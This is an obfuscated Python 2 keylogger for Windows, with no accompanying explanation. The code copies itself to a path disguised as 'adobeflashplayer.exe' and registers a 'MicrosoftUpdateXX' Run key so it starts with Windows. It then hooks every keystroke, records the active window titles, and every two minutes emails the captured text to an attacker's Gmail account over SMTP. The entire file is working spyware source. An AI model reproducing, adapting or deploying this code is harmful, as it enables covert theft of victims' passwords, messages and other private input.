import pythoncom #line:1
import pyHook #line:2
from os import path #line:3
from time import sleep #line:4
from threading import Thread #line:5
import urllib ,urllib2 #line:6
import smtplib #line:7
import datetime #line:8
import win32com .client #line:9
import win32event ,win32api ,winerror #line:10
from _winreg import *#line:11
import shutil #line:12
import sys #line:13
ironm =win32event .CreateMutex (None ,1 ,'NOSIGN')#line:15
if win32api .GetLastError ()==winerror .ERROR_ALREADY_EXISTS :#line:16
    ironm =None #line:17
    print ("nope")#line:18
    sys .exit ()#line:19
x ,data ,count ='','',0 #line:21
dir =r"C:\Users\Public\Libraries\adobeflashplayer.exe"#line:23
lastWindow =''#line:24
def startup ():#line:26
    shutil .copy (sys .argv [0 ],dir )#line:27
    O0000O0OO000OO000 =ConnectRegistry (None ,HKEY_CURRENT_USER )#line:28
    O00O000O00000000O =OpenKey (O0000O0OO000OO000 ,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0 ,KEY_WRITE )#line:29
    SetValueEx (O00O000O00000000O ,"MicrosoftUpdateXX",0 ,REG_SZ ,dir )#line:30
if not path .isfile (dir ):#line:31
    startup ()#line:32
def send_mail ():#line:35
    global data #line:36
    while True :#line:37
        if len (data )>30 :#line:38
            OO0OOO0OOOO0OO0OO =datetime .datetime .now ()#line:39
            OO00O00OO0OO0O000 ="smtp.gmail.com"#line:40
            O0OO0OO0O000000O0 =587 #line:41
            OOOOOOO0O0OO0OOOO =EEMAIL #line:42
            O00O00O00OO0O0OO0 =EPASS #line:43
            O0OOO0OO0O000OOO0 =OOOOOOO0O0OO0OOOO #line:44
            O00O0O0000OOO0O0O =[OOOOOOO0O0OO0OOOO ]#line:45
            OOO0OOO0O0OOOOOOO ="B33: "+OO0OOO0OOOO0OO0OO .isoformat ()#line:46
            OOO0OO0O00000000O =data #line:47
            OO0O0O00O00O0OOOO ="\r\n".join (("From: %s"%O0OOO0OO0O000OOO0 ,"To: %s"%O00O0O0000OOO0O0O ,"Subject: %s"%OOO0OOO0O0OOOOOOO ,"",OOO0OO0O00000000O ))#line:54
            try :#line:55
                OOO0OOO00O00O0OOO =smtplib .SMTP ()#line:56
                OOO0OOO00O00O0OOO .connect (OO00O00OO0OO0O000 ,O0OO0OO0O000000O0 )#line:57
                OOO0OOO00O00O0OOO .starttls ()#line:58
                OOO0OOO00O00O0OOO .login (OOOOOOO0O0OO0OOOO ,O00O00O00OO0O0OO0 )#line:59
                OOO0OOO00O00O0OOO .sendmail (O0OOO0OO0O000OOO0 ,O00O0O0000OOO0O0O ,OO0O0O00O00O0OOOO )#line:60
                data =''#line:61
                OOO0OOO00O00O0OOO .quit ()#line:62
            except Exception as OOOO0O00OOO00O0O0 :#line:63
                print (OOOO0O00OOO00O0O0 )#line:64
        sleep (120 )#line:65
def pushing (OOOOO0O000O0O00O0 ):#line:68
    global data ,lastWindow #line:69
    OOO00OOO0OO00O00O =OOOOO0O000O0O00O0 .WindowName #line:70
    OOO00O0O0OO0O0OO0 ={13 :' [ENTER] ',8 :' [BACKSPACE] ',162 :' [CTRL] ',163 :' [CTRL] ',164 :' [ALT] ',165 :' [ALT] ',160 :' [SHIFT] ',161 :' [SHIFT] ',46 :' [DELETE] ',32 :' [SPACE] ',27 :' [ESC] ',9 :' [TAB] ',20 :' [CAPSLOCK] ',38 :' [UP] ',40 :' [DOWN] ',37 :' [LEFT] ',39 :' [RIGHT] ',91 :' [SUPER] '}#line:90
    O00O0O00OO0OOO00O =OOO00O0O0OO0O0OO0 .get (OOOOO0O000O0O00O0 .Ascii ,chr (OOOOO0O000O0O00O0 .Ascii ))#line:91
    if OOO00OOO0OO00O00O !=lastWindow :#line:92
        lastWindow =OOO00OOO0OO00O00O #line:93
        data +=' { '+lastWindow +' } '#line:94
        data +=O00O0O00OO0OOO00O #line:95
    else :#line:96
        data +=O00O0O00OO0OOO00O #line:97
if __name__ =='__main__':#line:99
    triggerThread =Thread (target =send_mail )#line:100
    triggerThread .start ()#line:101
    hookManager =pyHook .HookManager ()#line:103
    hookManager .KeyDown =pushing #line:104
    hookManager .HookKeyboard ()#line:105
    pythoncom .PumpMessages ()
